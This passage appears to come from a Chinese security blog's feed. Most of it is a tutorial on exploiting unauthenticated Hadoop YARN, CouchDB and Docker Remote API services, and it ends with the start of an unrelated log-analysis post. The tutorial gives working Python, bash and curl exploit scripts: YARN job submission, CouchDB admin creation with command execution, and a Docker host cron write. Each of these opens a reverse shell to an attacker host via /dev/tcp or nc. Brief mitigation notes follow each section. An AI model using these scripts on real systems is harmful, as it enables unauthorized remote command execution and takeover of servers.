fm，EBay，Yahoo等知名公司使用着。它极大地精简化程序员进行分布式计算时所需的操作，用户大概通过如下步骤在hadoop中实现分布式处理：</p><ul><li>用户创建一个处理键值的map函数</li><li>产生了一套中间键/值</li><li>reduce函数合并中间值并把他们关联到对应的键</li></ul><h4 id="1-扫描探测-5"><a href="#1-扫描探测-5" class="headerlink" title="1. 扫描探测"></a><strong>1. 扫描探测</strong></h4><p><strong>1.1 常见端口</strong><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092654-b993fcbc-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092654-b993fcbc-5195-1.png" alt="img"></a></p><p><strong>1.2 敏感端口</strong></p><table><thead><tr><th>模块</th><th>节点</th><th>默认端口</th></tr></thead><tbody><tr><td>HDFS</td><td>NameNode</td><td>50070</td></tr><tr><td>HDFS</td><td>SecondNameNode</td><td>50090</td></tr><tr><td>HDFS</td><td>DataNode</td><td>50075</td></tr><tr><td>HDFS</td><td>Backup/Checkpoint node</td><td>50105</td></tr><tr><td>MapReduce</td><td>JobTracker</td><td>50030</td></tr><tr><td>MapReduce</td><td>TaskTracker</td><td>50060</td></tr></tbody></table><p>通过访问 NameNode WebUI 管理界面的 50070 端口，可以下载任意文件。而且，如果 DataNode 的默认端口 50075 开放，攻击者可以通过 HDSF 提供的 restful API 对 HDFS 存储的数据进行操作。</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092654-ba1d521e-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092654-ba1d521e-5195-1.png" alt="img"></a></p><h4 id="2-攻击手法"><a href="#2-攻击手法" class="headerlink" title="2. 攻击手法"></a><strong>2. 攻击手法</strong></h4><p>利用方法和原理中有一些不同。在没有 hadoop client 的情况下，直接通过 <a href="https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html" target="_blank" rel="noopener">REST API</a> 也可以提交任务执行。</p><p>利用过程如下：</p><ul><li>在本地监听等待反弹 shell 连接</li><li>调用 New Application API 创建 Application</li><li>调用 Submit Application API 提交</li></ul><p><strong>P牛的攻击脚本</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">##!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target = &apos;http://127.0.0.1:8088/&apos;</span><br><span class="line">lhost = &apos;192.168.0.1&apos; ## put your local host ip here, and listen at port 9999</span><br><span class="line"></span><br><span class="line">url = target + &apos;ws/v1/cluster/apps/new-application&apos;</span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[&apos;application-id&apos;]</span><br><span class="line">url = target + &apos;ws/v1/cluster/apps&apos;</span><br><span class="line">data = &#123;</span><br><span class="line">    &apos;application-id&apos;: app_id,</span><br><span class="line">    &apos;application-name&apos;: &apos;get-shell&apos;,</span><br><span class="line">    &apos;am-container-spec&apos;: &#123;</span><br><span class="line">        &apos;commands&apos;: &#123;</span><br><span class="line">            &apos;command&apos;: &apos;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&apos; % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &apos;application-type&apos;: &apos;YARN&apos;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092656-bac267fe-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092656-bac267fe-5195-1.png" alt="img"></a></p><h4 id="3-防范措施-2"><a href="#3-防范措施-2" class="headerlink" title="3. 防范措施"></a><strong>3. 防范措施</strong></h4><p><em>1. 网络访问控制</em><br>使用 安全组防火墙 或本地操作系统防火墙对访问源 IP 进行控制。如果您的 Hadoop 环境仅对内网服务器提供服务，建议不要将 Hadoop 服务所有端口发布到互联网。</p><p><em>2. 启用认证功能</em><br>启用 Kerberos 认证功能。</p><p><em>3. 更新补丁</em><br>不定期关注 Hadoop 官方发布的最新版本，并及时更新补丁。</p><h2 id="0x08-CouchDB未授权访问"><a href="#0x08-CouchDB未授权访问" class="headerlink" title="0x08 CouchDB未授权访问"></a>0x08 CouchDB未授权访问</h2><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON) API 访问。CouchDB会默认会在5984端口开放Restful的API接口，用于数据库的管理功能。<br>CouchDB允许用户指定一个二进制程序或者脚本，与CouchDB进行数据交互和处理，query_server在配置文件local.ini中的格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[query_servers]</span><br><span class="line">LANGUAGE = PATH ARGS</span><br><span class="line">默认情况下，配置文件中已经设置了两个query_servers:</span><br><span class="line"></span><br><span class="line">[query_servers]</span><br><span class="line">javascript = /usr/bin/couchjs /usr/share/couchdb/server/main.js</span><br><span class="line">coffeescript = /usr/bin/couchjs /usr/share/couchdb/server/main-coffee.js</span><br></pre></td></tr></table></figure><p>可以看到，CouchDB在query_server中引入了外部的二进制程序来执行命令，如果我们可以更改这个配置，那么就可以利用数据库来执行命令了</p><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。<br><a href="http://bobao.360.cn/learning/detail/4716.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/4716.html</a><br><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html" target="_blank" rel="noopener">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></p><p><em><code>影响版本：小于 1.7.0 以及 小于 2.1.1</code></em></p><p>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用CVE-2017-12635先增加一个管理员用户。</p><h4 id="1-扫描探测-6"><a href="#1-扫描探测-6" class="headerlink" title="1.扫描探测"></a><strong>1.扫描探测</strong></h4><p><code>nmap -p 5984 --script &quot;couchdb-stats.nse&quot; 127.0.0.1</code><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092656-bb389b86-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092656-bb389b86-5195-1.png" alt="img"></a></p><h4 id="2-两个版本的利用方式"><a href="#2-两个版本的利用方式" class="headerlink" title="2.两个版本的利用方式"></a><strong>2.两个版本的利用方式</strong></h4><p><strong><em>(1) 1.6.0 下的说明\</em></strong></p><p>依次执行如下请求即可触发任意命令执行,其中,vulhub:vulhub为管理员账号密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &apos;http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd&apos; -d &apos;&quot;id &gt;/tmp/success&quot;&apos;</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@your-ip:5984/vultest&apos;</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@your-ip:5984/vultest/vul&apos; -d &apos;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&apos;</span><br><span class="line">curl -X POST &apos;http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10&apos; -d &apos;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&apos; -H &apos;Content-Type:application/json&apos;</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092657-bbb7d2fc-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092657-bbb7d2fc-5195-1.png" alt="img"></a><br>第一个请求是添加一个名字为cmd的query_servers，其值为<code>id &gt;/tmp/success</code>，这就是我们后面待执行的命令。<br>第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。<br>第四个请求就是在这个Database里进行查询，因为我将language设置为cmd，这里就会用到我第一步里添加的名为cmd的query_servers，最后触发命令执行。</p><hr><p><strong><em>(2) 2.1.0 下的说明\</em></strong></p><p>2.1.0中修改了我上面用到的两个API，这里需要详细说明一下。<br>Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问/_membership即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://vulhub:vulhub@your-ip:5984/_membership</span><br></pre></td></tr></table></figure><p>可见，我们这里只有一个node，名字是nonode@nohost。</p><p>然后，我们修改nonode@nohost的配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d &apos;&quot;id &gt;/tmp/success&quot;&apos;</span><br></pre></td></tr></table></figure><p>然后，与1.6.0的利用方式相同，我们先增加一个Database和一个Document：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &apos;http://vulhub:vulhub@your-ip:5984/vultest&apos;</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@your-ip:5984/vultest/vul&apos; -d &apos;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&apos;</span><br></pre></td></tr></table></figure><p>Couchdb 2.x删除了_temp_view，所以我们为了触发query_servers中定义的命令，需要添加一个_view：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d &apos;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&apos; -H &quot;Content-Type: application/json&quot;</span><br></pre></td></tr></table></figure><p>增加_view的同时即触发了query_servers中的命令。</p><p><strong>2.1 p牛的python脚本 支持高低版本,需要在version = 定义</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">##!/usr/bin/env python3</span><br><span class="line">import requests</span><br><span class="line">from requests.auth import HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">target = &apos;http://127.0.0.1:5984&apos;</span><br><span class="line">command = &apos;&quot;bash -i &gt;&amp; /dev/tcp/192.168.2.64/2222 0&gt;&amp;1&quot;&apos;</span><br><span class="line">version = 2</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    &apos;Content-Type&apos;: &apos;application/json&apos;</span><br><span class="line">&#125;</span><br><span class="line">## session.proxies = &#123;</span><br><span class="line">##     &apos;http&apos;: &apos;http://127.0.0.1:8085&apos;</span><br><span class="line">## &#125;</span><br><span class="line">session.put(target + &apos;/_users/org.couchdb.user:wooyun&apos;, data=&apos;&apos;&apos;&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;wooyun&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;roles&quot;: [],</span><br><span class="line">  &quot;password&quot;: &quot;wooyun&quot;</span><br><span class="line">&#125;&apos;&apos;&apos;)</span><br><span class="line"></span><br><span class="line">session.auth = HTTPBasicAuth(&apos;wooyun&apos;, &apos;wooyun&apos;)</span><br><span class="line"></span><br><span class="line">if version == 1:</span><br><span class="line">    session.put(target + (&apos;/_config/query_servers/cmd&apos;), data=command)</span><br><span class="line">else:</span><br><span class="line">    host = session.get(target + &apos;/_membership&apos;).json()[&apos;all_nodes&apos;][0]</span><br><span class="line">    session.put(target + &apos;/_node/&#123;&#125;/_config/query_servers/cmd&apos;.format(host), data=command)</span><br><span class="line"></span><br><span class="line">session.put(target + &apos;/wooyun&apos;)</span><br><span class="line">session.put(target + &apos;/wooyun/test&apos;, data=&apos;&#123;&quot;_id&quot;: &quot;wooyuntest&quot;&#125;&apos;)</span><br><span class="line"></span><br><span class="line">if version == 1:</span><br><span class="line">    session.post(target + &apos;/wooyun/_temp_view?limit=10&apos;, data=&apos;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&apos;)</span><br><span class="line">else:</span><br><span class="line">    session.put(target + &apos;/wooyun/_design/test&apos;, data=&apos;&#123;&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&apos;)</span><br></pre></td></tr></table></figure><p><strong>2.2 bash自动化脚本</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">##!/bin/bash</span><br><span class="line"></span><br><span class="line">echo CouchDB getshell - c0debreak - tools.changesec.com</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">if [[ $## -ne 2 ]];then</span><br><span class="line">    echo Usage: $0 http://xx.xx.xx.xx:5984 myserver:myport</span><br><span class="line">    exit 1</span><br><span class="line">else</span><br><span class="line">    server=$1</span><br><span class="line">    cb=$&#123;2/:/\/&#125;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">function run() &#123;</span><br><span class="line">    cmd=$1</span><br><span class="line"></span><br><span class="line">    curl -XPUT &quot;$server/_config/query_servers/cmd&quot; -d &quot;\&quot;$cmd\&quot;&quot;</span><br><span class="line">    curl -XPUT &quot;$server/example&quot;</span><br><span class="line">    curl -XPUT &quot;$server/example/record&quot; -d &apos;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&apos;</span><br><span class="line">    curl --max-time 1 &quot;$server/example/_temp_view?limit=1&quot; -d &apos;&#123;&quot;language&quot;:&quot;cmd&quot;, &quot;map&quot;:&quot;&quot;&#125;&apos; -H &apos;Content-Type: application/json&apos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">run &quot;echo &apos;/bin/bash -i &gt;&amp; /dev/tcp/$cb 0&gt;&amp;1&apos; &gt; /tmp/shell&quot;</span><br><span class="line">run &quot;bash /tmp/shell&quot;</span><br><span class="line">run &quot;rm -f /tmp/shell&quot;</span><br><span class="line"></span><br><span class="line">curl -XDELETE &quot;$server/_config/query_servers/cmd&quot;</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092659-bc902134-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092659-bc902134-5195-1.png" alt="img"></a></p><h4 id="3-漏洞修复-1"><a href="#3-漏洞修复-1" class="headerlink" title="3. 漏洞修复"></a>3. 漏洞修复</h4><p><em>1、指定CouchDB绑定的IP</em> （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 文件中找到 <code>bind_address = 0.0.0.0</code>，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。</p><p><em>2、设置访问密码</em> （需要重启CouchDB才能生效） 在 <code>/etc/couchdb/local.ini</code>中找到<code>[admins]</code>字段配置密码。</p><h2 id="0x09-Docker未授权访问"><a href="#0x09-Docker未授权访问" class="headerlink" title="0x09 Docker未授权访问"></a>0x09 Docker未授权访问</h2><h4 id="1-基础介绍"><a href="#1-基础介绍" class="headerlink" title="1. 基础介绍"></a>1. 基础介绍</h4><p>[<a href="http://www.loner.fm/drops/##!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8]" target="_blank" rel="noopener">http://www.loner.fm/drops/##!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8]</a>(<a href="http://www.loner.fm/drops/##!/drops/1203.新姿势之Docker" target="_blank" rel="noopener">http://www.loner.fm/drops/##!/drops/1203.新姿势之Docker</a> Remote API未授权访问漏洞分析和利用)</p><p>docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供，具体的大家可以看官网介绍。</p><p>漏洞发现的起因是，有一位同学在使用docker swarm的时候，发现了管理的docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，然后他研究了下，发现这是 Docker Remote API，可以执行docker命令，比如访问 <a href="http://host:2375/containers/json" target="_blank" rel="noopener">http://host:2375/containers/json</a> 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成，然后他就开始吐槽了，这尼玛太不安全了。</p><p>然后我想了想 swarm是用来管理docker集群的，应该放在内网才对。问了之后发现，他是在公网上的几台机器上安装swarm的，并且2375端口的访问策略是开放的，所以可以直接访问。</p><h4 id="2-测试环境配置"><a href="#2-测试环境配置" class="headerlink" title="2. 测试环境配置"></a>2. 测试环境配置</h4><p>先关闭docker，然后开启：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker stop</span><br><span class="line">sudo docker daemon  -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock</span><br></pre></td></tr></table></figure><p>绑定Docker Remote Api在指定端口（这里是2375），可以自行测试。</p><p>参考API规范进行渗透：<a href="https://docs.docker.com/engine/reference/api/docker-remote-api-v1.23/" target="_blank" rel="noopener">https://docs.docker.com/engine/reference/api/docker-remote-api-v1.23/</a></p><p>操作Docker API可以使用python dockert api 完成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install docker-py</span><br></pre></td></tr></table></figure><p>API使用参考：<a href="https://docker-py.readthedocs.io/en/stable/api/##client-api" target="_blank" rel="noopener">https://docker-py.readthedocs.io/en/stable/api/##client-api</a></p><h4 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h4><p><strong>3.1 From:phith0n</strong><br>利用方法是，我们随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=&apos;http://your-ip:2375/&apos;)</span><br><span class="line">data = client.containers.run(&apos;alpine:latest&apos;, r&apos;&apos;&apos;sh -c &quot;echo &apos;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&apos; &gt;&gt; /tmp/etc/crontabs/root&quot; &apos;&apos;&apos;, remove=True, volumes=&#123;&apos;/etc&apos;: &#123;&apos;bind&apos;: &apos;/tmp/etc&apos;, &apos;mode&apos;: &apos;rw&apos;&#125;&#125;)</span><br></pre></td></tr></table></figure><p>写入crontab文件，成功反弹shell：</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180507092659-bcb5c09c-5195-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180507092659-bcb5c09c-5195-1.png" alt="img"></a></p><p><strong>3.2 python脚本</strong><br><a href="https://github.com/Tycx2ry/docker_api_vul" target="_blank" rel="noopener">https://github.com/Tycx2ry/docker_api_vul</a></p><ul><li>安装类库<br>pip install -r requirements.txt</li><li>查看运行的容器<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375</li><li>查看所有的容器<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -a</li><li>查看所有镜像<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -l</li><li>查看端口映射<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -L</li><li>写计划任务（centos,redhat等,加-u参数用于ubuntu等）<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口</li><li>写sshkey(自行修改脚本的中公钥)<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -k</li><li>在容器中执行命令<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -e <code>&quot;id&quot;</code> -I 容器id</li><li>删除容器<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -c -I 容器id</li><li>修改client api版本<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -v 1.22</li><li>查看服务端api版本<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -V</li></ul><p><strong>3.3 其他的一些exp</strong><br><a href="https://github.com/netxfly/docker-remote-api-exp" target="_blank" rel="noopener">https://github.com/netxfly/docker-remote-api-exp</a><br><a href="https://github.com/zer0yu/SomePoC/blob/master/Docker/Docker_Remote_API未授权访问漏洞.py" target="_blank" rel="noopener">https://github.com/zer0yu/SomePoC/blob/master/Docker/Docker_Remote_API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.py</a><br><a href="https://github.com/JnuSimba/MiscSecNotes/tree/master/Docker安全" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes/tree/master/Docker%E5%AE%89%E5%85%A8</a></p><h4 id="4-防护策略"><a href="#4-防护策略" class="headerlink" title="4. 防护策略"></a>4. 防护策略</h4><p><em>1.修改 Docker Remote API 服务默认参数。</em>注意：该操作需要重启 Docker 服务才能生效。</p><p><em>2.修改 Docker 的启动参数：</em><br>定位到 DOCKER_OPTS 中的 tcp://0.0.0.0:2375，将0.0.0.0修改为127.0.0.1<br>或将默认端口 2375 改为自定义端口<br>为 Remote API 设置认证措施。参照 官方文档 配置 Remote API 的认证措施。</p><p><em>3.注意：该操作需要重启 Docker 服务才能生效。</em><br>修改 Docker 服务运行账号。请以较低权限账号运行 Docker 服务；另外，可以限制攻击者执行高危命令。</p><p><em>4.注意：该操作需要重启 Docker 服务才能生效。</em><br>设置防火墙策略。如果正常业务中 API 服务需要被其他服务器来访问，可以配置安全组策略或 iptables 策略，仅允许指定的 IP 来访问 Docker 接口。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志分析系列-介绍</title>
      <link href="/2020/03/16/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-%E4%BB%8B%E7%BB%8D/"/>
      <url>/2020/03/16/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-%E4%BB%8B%E7%BB%8D/640.webp" alt="img"></p><p>如何实现统一日志分析平台</p><p><img src="/images/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-%E4%BB%8B%E7%BB%8D/640.webp" alt="img"></p><h2 id="gt-gt-gt-gt-统一日志分析架构"><a href="#gt-gt-gt-gt-统一日志分析架构" class="headerlink" title="&gt;**&gt;&gt;&gt;**统一日志分析架构"></a><strong>&gt;**</strong>&gt;<strong><strong>&gt;</strong></strong>&gt;**统一日志分析架构</h2><p>实现统一日志分析平台在不同企业中各不相同。主要表现在：平台对企业的适用性、企业自身的技术能力、技术团队对产品的优劣选择不同等。但是核心的架构基本还是如下图所示：</p><p><img src="/images/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-%E4%BB%8B%E7%BB%8D/640.webp" alt="img"></p><h2 id="gt-gt-gt-gt-实现统一日志分析难点"><a href="#gt-gt-gt-gt-实现统一日志分析难点" class="headerlink" title="&gt;**&gt;&gt;&gt;**实现统一日志分析难点"></a><strong>&gt;**</strong>&gt;<strong><strong>&gt;</strong></strong>&gt;**实现统一日志分析难点</h2><ul><li><p>难度1：技术难点</p></li><li><ul><li>复杂的网络环境如何来采集信息？</li><li>繁杂的日志类型如何定义统一解析规则？</li><li>TB甚至PB级别的日志如何快速查询？</li><li>地图炮无用什么才是最好的展示方式？</li><li>每天被报警打晕，如何自救？</li></ul></li><li><p>难度2：人，主要体现在没有良好的沟通撕逼撕不过。</p></li><li><ul><li>推动力度不够：老板不重视或伪重视；</li><li>推动阻力太大：别人是老板，你是工程师</li></ul></li></ul><p>小B作为一个安全工程师，理所当然的认为安全是最重要的(其实这是错误的)，但是小B也会灵活变通勾兑IT研发团队、业务团队一起推动，人多力量大。虽然大家的分析目的不一致，但是统一日志分析平台架构是大家都需要的。</p><h2 id="gt-gt-gt-gt-安全场景下的分析思路"><a href="#gt-gt-gt-gt-安全场景下的分析思路" class="headerlink" title="&gt;**&gt;&gt;&gt;**安全场景下的分析思路"></a><strong>&gt;**</strong>&gt;<strong><strong>&gt;</strong></strong>&gt;**安全场景下的分析思路</h2><p>如果硬要给安全场景分类的话，小B会分为：已知场景和未知场景。在已知场景中，我们常用的分析手法包括：基于正则表达式分析、基于统计聚合分析、基于关联分析；在未知场景中，我们使用的分析方法主要是数据挖掘，从数据中挖掘未知的东西。</p><h3 id="基于正则表达式分析"><a href="#基于正则表达式分析" class="headerlink" title="基于正则表达式分析"></a>基于正则表达式分析</h3><p>此类的分析方法主要适用于常见带有特征的攻击场景，比如：</p><ul><li>特定Payload场景：SQL注入、XSS、Bypass WAF等，可以总结为基于规则库进行分析；</li><li>特定关键字场景：爬虫(特定UA、Cookie等)；</li></ul><h3 id="基于统计与聚合分析"><a href="#基于统计与聚合分析" class="headerlink" title="基于统计与聚合分析"></a>基于统计与聚合分析</h3><p>此类的分析方法是：尽可能在不同维度下进行统计与聚合，根据统计聚合结果挖掘有价值的信息。最常见的就是分析场景就是：单位时间内的某个客户端对某个服务端的操作信息。</p><h3 id="基于关联分析"><a href="#基于关联分析" class="headerlink" title="基于关联分析"></a>基于关联分析</h3><p>此类的分析方法，需要有一定的基础数据，通过关联分析来举一反三，比如</p><ul><li>与外部情报关联分析：企业可以购买威胁情报(微步、威胁猎人)来关联内部的日志数据从而发现风险，比如：通过购买恶意域名情报，然后通过办公网出口流量与日志分析看是否有访问记录，如果有就可能代表内部有人中了木马或病毒。</li><li>与内部情报关联分析：以前面分析技术得到的结果作为依据标准来进行关联分析发现其他风险，比如：找到了一个恶意的用户IP，然后在日志分析系统中查找该IP的其它行为，说不定有意外收获，在IP这个维度要注意IP自身的属性信息。</li></ul><h3 id="数据挖掘分析"><a href="#数据挖掘分析" class="headerlink" 